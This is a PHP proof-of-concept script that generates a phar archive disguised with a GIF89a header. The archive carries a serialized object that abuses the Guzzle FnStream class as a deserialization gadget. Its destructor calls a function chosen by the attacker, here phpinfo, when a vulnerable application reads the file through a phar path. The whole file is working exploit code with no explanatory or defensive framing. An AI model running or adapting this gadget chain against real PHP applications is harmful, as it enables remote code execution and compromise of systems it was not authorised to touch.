<?php

namespace GuzzleHttp\Psr7 {
	class FnStream {

		public $_fn_close = "phpinfo";

		public function __destruct() {
			if (isset($this->_fn_close)) {
				call_user_func($this->_fn_close);
			}
		}
	}
}

namespace {
	@unlink("phar.phar");
	$phar = new Phar("phar.phar");
	$phar->startBuffering();
	$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
	$o = new \GuzzleHttp\Psr7\FnStream();
	$phar->setMetadata($o);
	$phar->addFromString("test.txt", "test");
	$phar->stopBuffering();

}
?>